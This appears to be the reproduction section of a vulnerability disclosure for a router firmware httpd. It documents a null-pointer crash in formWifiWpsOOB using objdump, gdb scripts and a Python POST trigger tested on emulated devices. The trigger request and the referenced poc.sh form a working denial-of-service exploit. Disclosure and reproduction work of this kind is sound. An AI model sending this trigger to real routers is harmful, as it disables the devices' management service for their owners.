# Reproduce and Capture Screenshots

Everything in `evidence/` was produced by the commands below. Anyone — reviewer or reader —
can re-run them and get the same output.

The commands assume the firmware is unpacked at `./squashfs-root` and that the `httpd`
binary has been copied out as `./httpd`.

---

## 0. Preparation

```bash
# extract the httpd from the firmware (AC9 example)
arm-linux-gnueabi-readelf -h httpd | head -5      # confirm ARM, ET_EXEC
arm-linux-gnueabi-readelf -sW httpd | grep -w formWifiWpsOOB
```

Expected: `formWifiWpsOOB` at `0x9b674`, size `776`.

---

## 1. `01-disassembly.png` — the missing guard

```bash
arm-linux-gnueabi-objdump -d --no-show-raw-insn \
    --start-address=0x9b674 --stop-address=0x9b97c httpd
```

**Capture:** the region containing

```
09b71c  ldr  r0, [fp, #-16]      ; <-- no guard before this
09b720  bl   atoi@plt            ; <-- dereference
...
09b74c  cmp  r3, #0              ; <-- guard, 44 bytes too late
```

Annotate the screenshot so the unguarded call and the late check are both visible.

---

## 2. `02-gdb-crash.png` — the crash

```bash
# terminal 1: start the guest under the gdb stub
setsid qemu-arm -g 1234 -L ./ bin/httpd &

# terminal 2: attach and continue
cat > /tmp/cmds.txt <<'EOF'
set architecture arm
set pagination off
set confirm off
target remote 127.0.0.1:1234
continue
info registers r0 r1 r2 r3 r6 pc lr sp
x/8i $pc-16
quit
EOF

gdb-multiarch -q -batch -x /tmp/cmds.txt
```

Then send the trigger (in a third shell or from inside the emulation container):

```bash
python3 - <<'PY'
import socket
req = (b'POST /goform/WifiWpsOOB HTTP/1.1\r\nHost: 192.168.0.1\r\n'
       b'Cookie: password=x\r\nContent-Type: application/x-www-form-urlencoded\r\n'
       b'Content-Length: 5\r\n\r\nfoo=1\r\n')
s = socket.create_connection(('192.168.0.1', 80), timeout=10)
s.sendall(req)
try:
    print(s.recv(256))
except Exception as e:
    print('no response:', type(e).__name__)
PY
```

**Capture:** the debugger output

```
Program received signal SIGSEGV, Segmentation fault.
r0 = 0x0   r6 = 0x0   pc = 0x3fdedafc
=> 0x3fdedafc:  ldrb  r3, [r6]
```

---

## 3. `03-fault-address.png` — the fault is address 0

```bash
cat > /tmp/cmds2.txt <<'EOF'
set architecture arm
set pagination off
set confirm off
target remote 127.0.0.1:1234
continue
p/x $r6
x/4xb $r6
quit
EOF

gdb-multiarch -q -batch -x /tmp/cmds2.txt
```

**Capture:**

```
$1 = 0x0
Cannot access memory at address 0x0
```

---

## 4. `04-caller-on-stack.png` — which `atoi` call

```bash
cat > /tmp/cmds3.txt <<'EOF'
set architecture arm
set pagination off
set confirm off
target remote 127.0.0.1:1234
continue
x/400xw $sp
quit
EOF

gdb-multiarch -q -batch -x /tmp/cmds3.txt > stack.txt
grep -n '0x0009b724' stack.txt
```

**Capture:** the stack line containing the return address

```
0x40800908:  0x000ef29c  0x00000001  0x40800f04  0x0009b724
```

…together with the disassembly showing `0x9b724` is the instruction right after
`bl atoi`. This is what proves the crashing call belongs to `formWifiWpsOOB`.

---

## 5. `05-trigger-ab.png` — two-case comparison

Run the included script, or by hand:

```bash
./poc.sh 192.168.0.1
```

**Capture:** the four numbered steps, i.e.

```
[2/4] baseline - 'index' present   → HTTP = 200
[3/4] trigger  - 'index' absent    → HTTP = 000   (connection closed)
[4/4] confirming the service is gone → HTTP = 000
```

Case A (a working request) is what makes case B meaningful — keep both lines in frame.

---

## 6. `06-all-models.png` — five devices

Per-device records live in `evidence/06-per-model-verification.md`. For an image, capture a
table (or a terminal) showing:

```
AC6     index present → 200 OK, alive   |  index absent → no response, process gone
AC9     index present → 200 OK, alive   |  index absent → no response, process gone (gdb-verified)
AC15    index present → 200 OK, alive   |  index absent → no response, process gone
AC18    index present → 200 OK, alive   |  index absent → no response, process gone
AC10U   index present → 200 OK, alive   |  index absent → no response, exited 139
```

---

## Optional: short screen recording

A 20–40 second recording of `./poc.sh` against a running instance is the most convincing
single artefact: request → no response → the management interface stops answering. Convert
to GIF if it should render inline in the README.

---

## Notes on the environment

- The device instance must be reachable at the address used in the commands; the emulated
  device's management address is typically `192.168.0.1`.
- The `httpd` binds to that address, so run the triggers from a namespace that can reach it
  (inside the emulation container is simplest).
- If a build answers `302` on first contact, obtain the server-issued cookie first — see
  `poc.sh`, which does this automatically.
- Nothing here modifies the firmware: the analysis works on the vendor's unmodified image.
